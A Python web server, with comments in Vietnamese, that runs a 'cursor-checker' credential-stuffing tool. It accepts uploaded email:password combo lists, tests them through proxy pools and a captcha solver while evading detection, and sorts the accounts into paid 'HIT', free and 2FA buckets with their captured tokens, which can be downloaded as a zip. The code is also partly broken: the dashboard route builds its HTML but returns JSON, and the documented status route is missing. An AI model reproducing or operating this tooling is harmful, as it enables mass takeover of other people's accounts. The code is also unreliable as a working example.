"""
Render web server — chạy checker ngầm + dashboard xem hit/kết quả.

Endpoints:
  GET  /          dashboard HTML (buckets, FREE/HIT, auto-refresh 5s)
  GET  /status    JSON: running, stats, run_dir, pool, queued
  GET  /results   zip run dir hiện tại
  GET  /healthz   health check cho Render
  POST /upload    body = combo text ("email:pass" /dong). ?enc=gz64 neu gzip+base64.

Env:
  PORT (Render set 10000) | BOTS (15) | RETRIES (6)
  CFSOLVE_URLS (config.py doc) | PROXIES_B64 hoac PROXIES_GZ_B64
  ACCOUNTS_B64 / ACCOUNTS_GZ_B64 (auto-start khi boot)
"""
import base64
import glob
import gzip
import io
import json
import os
import sys
import threading
import time
import zipfile
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

BASE = Path(__file__).resolve().parent
DATA = BASE / "render_data"
DATA.mkdir(exist_ok=True)

BOTS = int(os.environ.get("BOTS", "15"))
RETRIES = int(os.environ.get("RETRIES", "6"))
PORT = int(os.environ.get("PORT", "10000"))

STATE = {
    "running": False,
    "run_dir": None,
    "started_at": None,
    "finished_at": None,
    "queued": [],
    "history": [],   # cac run da chay tren instance
    "log": [],
}
_state_lock = threading.Lock()


def _log(msg):
    line = f"{time.strftime('%H:%M:%S')} {msg}"
    with _state_lock:
        STATE["log"].append(line)
        STATE["log"] = STATE["log"][-200:]
    print(line, flush=True)


def _decode_body(body: bytes, enc: str) -> str:
    if enc == "gz64":
        return gzip.decompress(base64.b64decode(body)).decode("utf-8", "ignore")
    if enc == "b64":
        return base64.b64decode(body).decode("utf-8", "ignore")
    return body.decode("utf-8", "ignore")


def _env_text(name_b64: str, name_gz: str) -> str:
    v = os.environ.get(name_gz)
    if v:
        return gzip.decompress(base64.b64decode(v)).decode("utf-8", "ignore")
    v = os.environ.get(name_b64)
    if v:
        return base64.b64decode(v).decode("utf-8", "ignore")
    return ""


def _run_checker(accounts_path: str):
    """Goi checker.main() trong thread nay (sys.argv trick — checker thu argparse)."""
    import checker
    with _state_lock:
        STATE["running"] = True
        STATE["started_at"] = time.time()
        STATE["finished_at"] = None
    # reset stats giua cac run
    with checker.stats_lock:
        for k in checker.stats:
            checker.stats[k] = 0
    with checker._404_LOCK:
        checker._404_STREAK["n"] = 0
    checker.DEFAULT_CAPTCHA_SOLVER = os.environ.get("CAPTCHA", "rendercf")
    sys.argv = ["checker.py",
                "--accounts", accounts_path,
                "--proxies", str(DATA / "proxies.txt"),
                "--bots", str(BOTS), "--retries", str(RETRIES)]
    try:
        checker.main()
        ok = True
    except Exception as e:
        _log(f"checker main exception: {type(e).__name__}: {e}")
        ok = False
    finally:
        # marker done: boot-heal khong chay lai combo da xong
        try:
            (DATA / ("done-" + Path(accounts_path).name)).write_text("ok", encoding="utf-8")
        except Exception:
            pass
        with _state_lock:
                STATE["history"].append({"dir": STATE["run_dir"], "ok": ok,
                                         "stats": dict(checker.stats)})
        _log(f"run done ok={ok}: {accounts_path}")


def _supervisor(accounts_path: str):
    """Chay account set nay; xong moi bot queue ke tiep."""
    t = threading.Thread(target=_run_checker, args=(accounts_path,), daemon=True)
    t.start()
    # theo doi run_dir moi nhat (checker tao o main)
    import checker
    while True:
        with _state_lock:
            rd = STATE["run_dir"]
        if rd and Path(rd).exists() and (Path(rd) / "free.txt").exists():
            break
        if not STATE["running"] and STATE["finished_at"]:
            break
        time.sleep(0.5)
    t.join()
    # queue ke tiep
    with _state_lock:
        nxt = STATE["queued"].pop(0) if STATE["queued"] else None
    if nxt:
        _log(f"chay tiep tu queue: {nxt}")
        threading.Thread(target=_supervisor, args=(nxt,), daemon=True).start()


def submit_accounts(text: str) -> str:
    """Ghi combo -> file; start ngay hoac queue. Return path."""
    lines = [l.strip() for l in text.splitlines() if l.strip()]
    path = str(DATA / f"combo-{time.strftime('%Y%m%d-%H%M%S')}.txt")
    Path(path).write_text("\n".join(lines) + "\n", encoding="utf-8")
    with _state_lock:
        busy = STATE["running"]
        if not busy:
            STATE["queued"].append(path)  # _supervisor pop ngay
    if busy:
        _log(f"queued {len(lines)} acc -> {path}")
        return path
    _log(f"start run {len(lines)} acc -> {path}")
    threading.Thread(target=_supervisor, args=(path,), daemon=True).start()
    return path


def _read_hits(run_dir: str):
    """Doc free.txt + hits.txt (bo phan token dai)."""
    out = {"hits": [], "free": []}
    if not run_dir:
        return out
    rd = Path(run_dir)
    for key, fname, limit in (("hits", "hits.txt", 200), ("free", "free.txt", 500)):
        p = rd / fname
        if not p.exists():
            continue
        rows = []
        for line in p.read_text(encoding="utf-8", errors="ignore").splitlines()[:limit]:
            parts = [x.strip() for x in line.split("|")]
            acc = parts[0] if parts else line[:80]
            short = []
            for x in parts[1:]:
                if len(x) > 60:
                    x = x[:24] + "..." + f"({len(x)}c)"
                short.append(x)
            rows.append(acc + (" | " + " | ".join(short) if short else ""))
        out[key] = rows
    return out


DASH = """<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="5">
<title>cursor-checker @render</title>
<style>
 body{font-family:ui-monospace,Consolas,monospace;background:#111;color:#ddd;padding:16px}
 h1{font-size:18px} h2{font-size:15px;color:#8fd;margin:14px 0 6px}
 .grid{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;max-width:900px}
 .card{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:10px;text-align:center}
 .n{font-size:26px;font-weight:700} .l{font-size:11px;color:#999}
 .free .n{color:#4c8} .hit .n{color:#fc4} .err .n{color:#f66}
 .bar{background:#222;border-radius:6px;height:10px;max-width:900px;margin:10px 0}
 .fill{height:10px;border-radius:6px;background:#4c8}
 pre{background:#1b1b1b;border:1px solid #333;border-radius:8px;padding:10px;
     max-height:340px;overflow:auto;font-size:12px;white-space:pre-wrap}
 a{color:#7cf} .muted{color:#888;font-size:12px}
</style></head><body>
<h1>cursor-checker &middot; __STATE__</h1>
<div class="muted">run: __RUNDIR__ &middot; started __STARTED__ &middot; <a href="/results" target="_blank">tai ket qua (zip)</a></div>
<div class="bar"><div class="fill" style="width:__PCT__%"></div></div>
<div class="grid">
 <div class="card hit"><div class="n">__HIT__</div><div class="l">HIT (plan)</div></div>
 <div class="card free"><div class="n">__FREE__</div><div class="l">FREE</div></div>
 <div class="card"><div class="n">__FAIL__</div><div class="l">FAIL</div></div>
 <div class="card"><div class="n">__TERM__</div><div class="l">TERMINAL (radar)</div></div>
 <div class="card err"><div class="n">__ERR__</div><div class="l">ERROR+RETRY</div></div>
 <div class="card"><div class="n">__DONE__</div><div class="l">done</div></div>
 <div class="card"><div class="n">__TOTAL__</div><div class="l">total</div></div>
 <div class="card"><div class="n">__CUST__</div><div class="l">CUSTOM 2FA</div></div>
 <div class="card"><div class="n">__BAD__</div><div class="l">BADFMT</div></div>
 <div class="card"><div class="n">__QUE__</div><div class="l">queued combo</div></div>
</div>
<h2>HIT (__NHIT__)</h2><pre>__HITS__</pre>
<h2>FREE (__NFREE__)</h2><pre>__FREE__</pre>
<h2>log</h2><pre>__LOG__</pre>
</body></html>"""


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # im http access log

    def _send(self, code, body: bytes, ctype="text/html; charset=utf-8"):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        import checker
        path = self.path.split("?")[0]
        if path in ("/", "/index.html"):
            with _state_lock:
                st = dict(STATE)
            with checker.stats_lock:
                s = dict(checker.stats)
            hits = _read_hits(st.get("run_dir"))
            term = sum(1 for _ in open(Path(st["run_dir"]) / "terminal.txt",
                                       encoding="utf-8", errors="ignore")
                       ) if st.get("run_dir") and (Path(st["run_dir"]) / "terminal.txt").exists() else 0
            pct = int(100 * s.get("DONE", 0) / max(1, s.get("TOTAL", 1)))
            started = time.strftime("%H:%M:%S", time.localtime(st["started_at"])) if st["started_at"] else "-"
            html = (DASH
                    .replace("__STATE__", "DANG CHAY" if st["running"] else "nghi")
                    .replace("__RUNDIR__", str(st.get("run_dir") or "-"))
                    .replace("__STARTED__", started)
                    .replace("__PCT__", str(pct))
                    .replace("__HIT__", str(s.get("HIT", 0)))
                    .replace("__FREE__", str(s.get("FREE", 0)))
                    .replace("__FAIL__", str(s.get("FAIL", 0)))
                    .replace("__TERM__", str(term))
                    .replace("__ERR__", str(s.get("ERROR", 0) + s.get("RETRY", 0)))
                    .replace("__DONE__", str(s.get("DONE", 0)))
                    .replace("__TOTAL__", str(s.get("TOTAL", 0)))
                    .replace("__CUST__", str(s.get("CUSTOM", 0)))
                    .replace("__BAD__", str(s.get("BADFORMAT", 0)))
                    .replace("__QUE__", str(len(st["queued"])))
                    .replace("__NHIT__", str(len(hits["hits"])))
                    .replace("__NFREE__", str(len(hits["free"])))
                    .replace("__HITS__", "\n".join(hits["hits"]) or "(chua co)")
                    .replace("__FREE__", "\n".join(hits["free"]) or "(chua co)")
                    .replace("__LOG__", "\n".join(st["log"][-30:]) or "-"))
            with _state_lock:
                st = dict(STATE)
            with checker.stats_lock:
                s = dict(checker.stats)
            st["stats"] = s
            st["pool_proxies"] = getattr(checker, "_last_pool_count", None)
            self._send(200, json.dumps(st, ensure_ascii=False).encode(),
                       "application/json")
        elif path == "/results":
            rd = None
            with _state_lock:
                rd = STATE.get("run_dir")
            if not rd or not Path(rd).exists():
                # process-restart giu nguyen disk container: quet run moi nhat
                runs = sorted((BASE / "results").glob("run-*"),
                              key=lambda p: p.stat().st_mtime)
                rd = str(runs[-1]) if runs else None
            if not rd or not Path(rd).exists():
                self._send(200, b"chua co run nao", "text/plain")
                return
            buf = io.BytesIO()
            with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
                for p in sorted(Path(rd).glob("*.txt")):
                    z.write(p, p.name)
                for p in sorted(DATA.glob("combo-*.txt")):
                    z.write(p, f"uploads/{p.name}")
            self._send(200, buf.getvalue(), "application/zip")
        elif path == "/healthz":
            self._send(200, b"ok", "text/plain")
        else:
            self._send(404, b"not found", "text/plain")

    def do_POST(self):
        if self.path.split("?")[0] != "/upload":
            self._send(404, b"not found", "text/plain")
            return
        enc = "raw"
        if "enc=gz64" in self.path:
            enc = "gz64"
        elif "enc=b64" in self.path:
            enc = "b64"
        n = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(n) if n else b""
        if not body.strip():
            self._send(400, b"body trong", "text/plain")
            return
        try:
            text = _decode_body(body, enc)
        except Exception as e:
            self._send(400, f"decode loi ({enc}): {e}".encode(), "text/plain")
            return
        path = submit_accounts(text)
        self._send(200, json.dumps({"ok": True, "file": path,
                                    "lines": len(text.splitlines())}).encode(),
                   "application/json")

def _track_run_dir():
    """Cap nhat STATE.run_dir theo checker.OUT_DIR (checker tao moi moi run)."""
    import checker
    while True:
        rd = getattr(checker, "OUT_DIR", None)
        with _state_lock:
            if rd and rd != STATE["run_dir"]:
                STATE["run_dir"] = rd
        time.sleep(1)
def _pin_proxy_ips(lines):
    """Resolve hostname proxy -> IP 1 lan khi boot (Render DNS giai do 15 thread
    bi curl(5) 'Could not resolve proxy'). Giu nguyen IP dong. Return list moi."""
    import socket
    resolved = {}
    for l in lines:
        s = l.strip()
        if not s:
            continue
        body = s.split("://", 1)[1] if "://" in s else s
        host = body.rsplit("@", 1)[-1].rsplit(":", 1)[0]
        if host and not host[0].isdigit() and host not in resolved:
            try:
                resolved[host] = socket.getaddrinfo(host, None, socket.AF_INET)[0][4][0]
            except Exception:
                resolved[host] = None
    out = []
    for l in lines:
        s = l.strip()
        if not s:
            continue
        body = s.split("://", 1)[1] if "://" in s else s
        host = body.rsplit("@", 1)[-1].rsplit(":", 1)[0]
        if host and not host[0].isdigit() and resolved.get(host):
            out.append(s.replace(host, resolved[host], 1))
        else:
            out.append(s)
    return out


def main():
    # proxies tu env (pin IP: DNS Render chat khi 15 bot resolve lien tuc -> curl(5))
    prox = _env_text("PROXIES_B64", "PROXIES_GZ_B64")
    if prox:
        lines = [l for l in prox.splitlines() if l.strip()]
        pinned = _pin_proxy_ips(lines)
        (DATA / "proxies.txt").write_text("\n".join(pinned) + "\n", encoding="utf-8")
        _log(f"proxies tu env: {len(lines)} dong -> pin IP {sum(1 for a, b in zip(lines, pinned) if a != b)} host")
    else:
        _log("KHONG co PROXIES env — checker se chay khong proxy (Render IP datacenter, de bi radar)")
    # solver urls tu env da xu ly o config (CFSOLVE_URLS)

    threading.Thread(target=_track_run_dir, daemon=True).start()
    # auto-start neu co accounts env
    acc = _env_text("ACCOUNTS_B64", "ACCOUNTS_GZ_B64")
    if acc:
        _log("accounts tu env — auto start")
        submit_accounts(acc)
    # BOOT SELF-HEAL (2026-10-31): process-restart giu nguyen disk container —
    # combo chua co marker done- -> tu chay lai (Render restart mat state in-memory)
    def _heal():
        time.sleep(5)
        for p in sorted(DATA.glob("combo-*.txt"), key=lambda x: x.stat().st_mtime):
            if (DATA / ("done-" + p.name)).exists():
                continue
            if p.stat().st_size < 10:
                continue
            _log(f"self-heal: phuc hoi combo {p.name}")
            submit_accounts(p.read_text(encoding="utf-8"))
    threading.Thread(target=_heal, daemon=True).start()
    srv = ThreadingHTTPServer(("0.0.0.0", PORT), Handler)
    _log(f"dashboard: http://0.0.0.0:{PORT}/ (upload POST /upload)")
    srv.serve_forever()


if __name__ == "__main__":
    main()
